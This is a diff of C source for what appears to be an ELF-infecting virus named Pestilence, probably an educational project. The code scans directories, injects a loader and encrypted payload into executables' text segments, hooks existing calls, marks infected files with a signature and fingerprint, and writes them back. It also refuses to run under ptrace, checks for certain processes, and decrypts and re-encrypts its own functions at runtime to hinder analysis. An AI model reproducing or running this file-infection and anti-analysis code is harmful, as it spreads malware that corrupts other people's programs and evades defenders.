@@ -1,60 +1,16 @@
 #include "pestilence.h"
 
-static void	init_info(t_info *info)
+static void	init_info(t_info *info, size_t *tab_addr)
 {
 	info->text_begin = 0;
 	info->text_size = 0;
 	info->valid_target = 1;
+	info->in_pestilence = 0;
+
+	info->tab_addr = tab_addr;
+
 }
 
-static void	patch_loader(t_info *info)
-{
-	int32_t	start;
-	int32_t	end;
-	int32_t val;
-
-	// rewrite jmp to payload
-// 	start = info->text_addr + info->text_size + LOADER_SIZE;
-// 	end = (int32_t)(info->addr_payload + MAIN_OFFSET);
-// 	val = end - start;
-// 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);
-
-	// rewrite addr for mprotect
-	start = info->text_addr + info->text_size + 0x68;
-	end = info->addr_payload;
-	val = end - start;
-	ft_memcpy(info->text_begin + info->text_size + 0x64, &val, 4); // 0x65 is pos of instruction targeted in loader
-}
-
-static void	inject_loader(t_info *info)
-{
-	void		*addr;
-
-	addr = &loader;
-	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
-	patch_loader(info);
-}
-
-
-static void	patch_payload(t_info *info)
-{
-	int32_t	start;
-	int32_t	end;
-	int32_t	val;
-
-	start = (int32_t)(info->addr_payload + PAYLOAD_SIZE);
-	end = info->text_addr + info->text_size + LOADER_SIZE;
-	val = end - start;
-
-	// replace jmp addr
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 4, &val, 4);
-	// replace ret by jmp
-	val = 0xe9;
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 5, &val, 1);
-	// replace leave by pop rbp
-	val = 0x5dec8948;
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 9, &val, 4);
-}
 
 static void	inject_payload(t_info *info)
 {
@@ -62,85 +18,36 @@ static void	inject_payload(t_info *info)
 
 	addr = &ft_memcpy;
 	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
-	ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
+	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
+ 	uint32_t key = decrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], 14);
 	patch_payload(info);
+ 	reencrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], key);
 }
 
-void	patch_end(t_info *info, int32_t nb)
+
+static void	inject_loader(t_info *info)
 {
-	int32_t	start;
-	int32_t	end;
-	int32_t	val;
+	void	*addr;
 
-	// get addr of end of end
-	start = info->text_addr + info->text_size + LOADER_SIZE + END_SIZE;
-	if (nb == 1)
-		start -= 0x183;//REPLACE1
-	if (nb == 2)
-		start -= 0xc8;//REPLACE2
-	if (nb == 3)
-		start -= 0xc3;//REPLACE3
-	if (nb == 4)
-		start -= 0x169;//REPLACE4
-	if (nb == 5)
-		start -= 0x21;//REPLACE5
-	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
-	val = end - start;
-	if (nb == 1)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x183/*REPLACE1*/ - 4, &val, 4);
-	if (nb == 2)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0xc8/*REPLACE2*/ - 4, &val, 4);
-	if (nb == 3)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0xc3/*REPLACE3*/ - 4, &val, 4);
-	if (nb == 4)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x169/*REPLACE4*/ - 4, &val, 4);
-	if (nb == 5)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x21/*REPLACE5*/ - 4, &val, 4);
+	addr = &loader;
+	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
 }
 
-static void	inject_end(t_info *info)
+static void	inject_bis(t_info *info)
 {
 	void		*addr;	
 
-	addr = &ft_end;
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, addr, END_SIZE);
+	addr = &syscalls;
+	ft_memcpy(info->file + info->offset_bis, addr, BIS_SIZE);
 }
 
-static void	patch_addresses(t_info *info)
-{
-	int32_t		start;
-	int32_t		end;
-	int32_t		val;
-
-	// &loader
-	start = info->addr_payload + OFFSET_1 + 4;
-	end = (int32_t)(info->text_addr + info->text_size);
-	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);
-
-	// &ft_memcpy
-	start = info->addr_payload + OFFSET_2 + 4;
-	end = (int32_t)(info->addr_payload);
-	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_2, &val, 4);
-
-	// &ft_end
-	start = info->addr_payload + OFFSET_3 + 4;
-	end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
-	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);
-
-	// &ptrace in man
-	ft_memset(info->file + info->offset_payload + OFFSET_4, 40, '\x90');
-	
-}
 
 static int		reload_mapping(t_info *info)
 {
 	void	*new;
 	size_t	new_size;
 
-	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE;
+	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE + BIS_SIZE;
 	if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 		return (1);
 	ft_memcpy(new, info->file, info->file_size);
@@ -150,137 +57,155 @@ static int		reload_mapping(t_info *info)
 	return (0);
 }
 
-static int		inject_sign(t_info *info)
+static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
 {
 	uint32_t	magic = MAGIC_VIRUS;
 	char		buf[0x40];
 
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE, &magic, 4);
+	//sign
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
 	write_sign(buf);
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE + 4, buf, SIGN_SIZE);
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4, buf, SIGN_SIZE);
+	//fingerprint
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4 + SIGN_SIZE, &(fingerprint->fingerprint), 4);
+	//index
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 5, &(fingerprint->index), 4);
 	return (0);
 }
 
-uint32_t    encrypt(t_info *info, void *ptr, size_t size)
-{
-    uint32_t    *file;
-    uint32_t    key;
-    size_t      i;  
+/*
+   static void	nice_with_gdb(t_info *info)
+   {
+   size_t size;
 
-    file = (uint32_t *)ptr;
+   size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
+   size = size - info->begin_bss;
+   ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
+   }
+   */
 
-	uint32_t start = info->text_addr + info->text_size + LOADER_SIZE;
-	uint32_t end = (int32_t)(info->addr_payload + MAIN_OFFSET);
-	key = end - start; // key is now offset to jump payload from loader
-// 	dprintf(1, "%#x\n", key);
-//     key = KEY;
-    int nb = 0;
-	size = (size / 4 ) * 4;
-    while (nb < 8)
-    {   
-        i = 0;
-        while (i * 4 < size - 4)
-        {   
-            file[i] ^= key;
-            key += file[i];
-            i++;
-        }   
-        key -= SUB;
-        nb++;
-    }
-    return (key);
-}
-
-uint32_t	hash_loader(t_info *info)
-{
-	uint32_t	hash = 5381;
-	size_t		size;
-	char		*str;
-
-	str = (char *)(info->text_begin + info->text_size);
-	size = LOADER_SIZE;
-	
-	size_t i = 0;
-	while (i < size)
-	{
-		if (i < 0x7F || i > 0x7F + 6)
-			hash = ((hash << 5) + hash) + str[i];
-		i++;
-	}
-	return (hash);
-}
-
-void			patch_key(t_info *info, uint32_t key)
-{
-	uint32_t val;
-	uint32_t hash;
-
-	hash = hash_loader(info);
-	hash = 0;
-	// Key in loader
-	val = key - hash;
-	ft_memcpy(info->text_begin + info->text_size + 0x81, &val, 4); // 0x73 is pos of instruction targeted in loader
-}
-
-
-static void	nice_with_gdb(t_info *info)
-{
-	size_t size;
-	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
-	size = size - info->begin_bss;
-
- 	ft_memcpy_r(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->begin_bss, size);
-}
-
-static void		infect_file(char *path)
+static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 {
 	struct stat		st;
-	t_info			info;
-	int				fd;
 	uint32_t		magic;
+
 	
-	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
+	if ((info->fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
-	init_info(&info);
-	ft_sysfstat(fd, &st);
-	info.file_size = st.st_size;
-	if ((info.file_size > 50*1024*1024) || info.file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
+	ft_sysfstat(info->fd, &st);
+	info->file_size = st.st_size;
+	if ((info->file_size > 50*1024*1024) || info->file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
 		goto end_close;
-	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+	if ((info->file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, info->fd, 0)) == MAP_FAILED)
 		goto end_close;
-	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
+	if ((magic = *((uint32_t *)(info->file))) != 0x464C457F)
 		goto end_fct;
-	if (pe_parsing(&info) == 1)
+	uint32_t key = decrypt_func(info, &pe_parsing, info->tab_addr[10] - info->tab_addr[9], 9);
+	int ret = pe_parsing(info);
+	reencrypt_func(info, &pe_parsing, info->tab_addr[10] - info->tab_addr[9], key);
+	if (ret == 1)
 		goto end_fct;
-	if (reload_mapping(&info) == 1)
+	key = decrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], 24);
+	ret = reload_mapping(info);
+	reencrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], key);
+	if (ret == 1)
 		goto end_fct;
-	if (find_text(&info) == 1)
+	key =  decrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], 5);
+	ret = find_text(info, fingerprint);
+	reencrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], key);
+	if (ret == 1)
 		goto end_fct;
-	inject_loader(&info);
-	nice_with_gdb(&info);
-	inject_payload(&info);
-	inject_end(&info);
-	epo_parsing(&info);
-	if (info.valid_target == 0)
+	//key =  decrypt_func(info, &inject_loader, info->tab_addr[23] - info->tab_addr[22], 22);
+	inject_loader(info);
+	//reencrypt_func(info, &inject_loader, info->tab_addr[23] - info->tab_addr[22], key);
+	// nice_with_gdb(info);
+	//VOIR ICI
+// 	key = decrypt_func(info, &inject_payload, info->tab_addr[22] - info->tab_addr[21], 21);
+	inject_payload(info);
+// 	reencrypt_func(info, &inject_payload, info->tab_addr[22] - info->tab_addr[21], key);
+	inject_bis(info);
+	key = decrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], 8);
+	epo_parsing(info);
+	reencrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], key);
+	if (info->valid_target == 0)
 		goto end_fct;
-	patch_addresses(&info);
-	inject_sign(&info);
-	patch_key(&info, encrypt(&info, info.file + info.offset_payload, PAYLOAD_SIZE));
-	ft_syswrite(fd, info.file, info.file_size);
-	end_fct:
-	ft_sysmunmap(info.file, info.file_size);
-	end_close:
-	ft_sysclose(fd);
+	key = decrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], 16);
+	patch_addresses(info);
+	reencrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], key);
+	key = decrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], 25);
+	inject_sign(info, fingerprint);
+	reencrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], key);
+	crypt_payload(info, fingerprint->fingerprint);
+	patch_key(info, encrypt(info, info->file + info->offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
+	ft_syswrite(info->fd, info->file, info->file_size);
+end_fct:
+	ft_sysmunmap(info->file, info->file_size);
+end_close:
+	ft_sysclose(info->fd);
 	return ;
 }
 
-static int		infect_dir(char *path)
+static int	get_index_file(char *path)
 {
-	char					buf_d[1024];
-	struct linux_dirent64	*dir;
-	int						fd, n_read, pos;
-	char					buf_path_file[PATH_MAX];
+	struct stat	st;
+	int		fd;
+	uint32_t	magic, index;
+	size_t		file_size;
+	void		*file;
+	Elf64_Ehdr	*main_header;
+	Elf64_Phdr	*header;
+	size_t		base_entry;
+	int32_t		i;
+	void		*addr_magic;
 
+	index = 0;
+	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
+		return 0;
+	ft_sysfstat(fd, &st);
+	file_size = st.st_size;
+	if ((file_size > 60*1024*1024) || file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
+		goto end_close;
+	if ((file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+		goto end_close;
+	if ((magic = *((uint32_t *)(file))) != 0x464C457F)
+		goto end_fct;
+	main_header = (Elf64_Ehdr *)(file);
+	base_entry = main_header->e_entry;
+	i = 0;
+	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
+	if (file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
+		goto end_fct;
+	while (i < main_header->e_phnum)
+	{
+		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
+		{
+			addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
+			magic = *((uint32_t *)(addr_magic));
+			if (magic == MAGIC_VIRUS)
+			{
+				index = (*((uint32_t *)(addr_magic - 5)));
+				goto end_fct;
+			}
+		}
+		header++;
+		i++;
+	}
+end_fct:
+	ft_sysmunmap(file, file_size);
+end_close:
+	ft_sysclose(fd);
+	return index;
+}
+
+static int	file_path(char *path, t_fingerprint *fingerprint, char choice, t_info *info)
+{
+	char			buf_d[1024];
+	struct linux_dirent64	*dir;
+	int			fd, n_read, pos;
+	uint32_t		index, tmp_index;
+	char			buf_path_file[PATH_MAX];
+
+	index = 0;
 	n_read = 0;
 	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
 		return (1);
@@ -291,34 +216,153 @@ static int		infect_dir(char *path)
 			dir = (struct linux_dirent64 *)(buf_d + pos);
 			if (dir->d_type == 8) //dt_reg
 			{
-				ft_memcpy(buf_path_file, path, PATH_MAX);
-				ft_strcat(buf_path_file, dir->d_name);
-				infect_file(buf_path_file);
+				if (choice == 1)
+				{	//get highest index
+					fingerprint->fingerprint += 1;
+					ft_memcpy(buf_path_file, path, PATH_MAX);
+					ft_strcat(buf_path_file, dir->d_name);
+					uint32_t key = decrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], 27);
+					tmp_index = get_index_file(buf_path_file);
+					reencrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], key);
+					if (tmp_index > index)
+						index = tmp_index;
+				} else
+				{	//infect dir
+					ft_memcpy(buf_path_file, path, PATH_MAX);
+					ft_strcat(buf_path_file, dir->d_name);
+					uint32_t key = decrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], 26);
+					infect_file(buf_path_file, fingerprint, info);
+					reencrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], key);
+					fingerprint->fingerprint -= 1;
+				}
 			}
 			pos += dir->d_reclen;
 		}
 	}
 	ft_sysclose(fd);
-	return (0);
+	return (index);
 }
 
-int		main()
+static void	close_entries(void)
 {
+	double_ret();
+	uint32_t	addr_origin;
+	void		*addr;
+	void		*addr_hook;
+
+	addr = get_rip();
+	mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
+	addr_origin = -1;
+	addr_hook = addr + 0x12345678;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -2;
+	addr_hook = addr + 0x12345678;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -3;
+	addr_hook = addr + 0x12345678;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -4;
+	addr_hook = addr + 0x12345678;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -5;
+	addr_hook = addr + 0x12345678;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+}
+
+void		fill_tab_addr(size_t *tab_addr)
+{
+	//parsing.c
+	tab_addr[0] = (size_t)&update_index;
+	tab_addr[1] = (size_t)&check_magic;
+	tab_addr[2] = (size_t)&get_padding_size;
+	tab_addr[3] = (size_t)&valid_call;
+	tab_addr[4] = (size_t)&patch_sections_header;
+	tab_addr[5] = (size_t)&find_text;
+	tab_addr[6] = (size_t)&hook_call;
+	tab_addr[7] = (size_t)&patch_close_entries;
+	tab_addr[8] = (size_t)&epo_parsing;
+	tab_addr[9] = (size_t)&pe_parsing;
+	tab_addr[10] = (size_t)&parse_process;
+	tab_addr[11] = (size_t)&check_process;
+
+	//utils.c
+	tab_addr[12] = (size_t)&itoa;
+
+	//patch.c
+	tab_addr[13] = (size_t)&patch_loader;
+	tab_addr[14] = (size_t)&patch_payload;
+	tab_addr[15] = (size_t)&patch_bis;
+	tab_addr[16] = (size_t)&patch_addresses;
+	
+	//check_ownfile.c
+	tab_addr[17] = (size_t)&get_path_own_file;
+	tab_addr[18] = (size_t)&rewrite_own_file;
+	tab_addr[19] = (size_t)&update_own_index;
+
+	//pestilence.c
+	tab_addr[20] = (size_t)&init_info; //jump
+	tab_addr[21] = (size_t)&inject_payload;
+	tab_addr[22] = (size_t)&inject_loader;
+	tab_addr[23] = (size_t)&inject_bis;
+	tab_addr[24] = (size_t)&reload_mapping;
+	tab_addr[25] = (size_t)&inject_sign;
+	tab_addr[26] = (size_t)&infect_file;
+	tab_addr[27] = (size_t)&get_index_file;
+	tab_addr[28] = (size_t)&file_path;
+	tab_addr[29] = (size_t)&close_entries;
+	tab_addr[30] = (size_t)&fill_tab_addr;
+}
+
+int		main(void)
+{
+	size_t			tab_addr[31];
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
+	uint32_t		tmp_index;
+	t_fingerprint		fingerprint;
+	t_info			info;
 
 	if (ft_sysptrace(0, 0, 1, 0) == -1)
 		return (0);
+	fill_tab_addr(tab_addr);
+	init_info(&info, tab_addr);
+	info.in_pestilence = 1;
+	close_entries();
 	write_proc(buf_path);
-	if ((check_process(buf_path)) == 1)
-		return (0);
 
+	uint32_t key = decrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], 11);
+	int ret = check_process(buf_path, &info);
+	if (ret == 1)
+		return (0);
+	reencrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], key);
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
-
-	write_test(buf_path);
-	infect_dir(buf_path);
 	write_test2(buf_path);
-	infect_dir(buf_path);
+	fingerprint.fingerprint = 0;
+	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	tmp_index = file_path(buf_path, &fingerprint, 1, &info);
+	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	write_test(buf_path);
+	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	fingerprint.index = file_path(buf_path, &fingerprint, 1, &info);
+	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	if (tmp_index > fingerprint.index)
+		fingerprint.index = tmp_index;
+	key = decrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], 19);
+	update_own_index(&fingerprint, &info); // update fingerprint.index and update own exec
+	reencrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], key);
+	fingerprint.index += fingerprint.fingerprint;
+	fingerprint.fingerprint = fingerprint.index;
+	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	file_path(buf_path, &fingerprint, 0, &info);
+	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	write_test2(buf_path);
+	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	file_path(buf_path, &fingerprint, 0, &info);
+	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
 	return (0);
 }
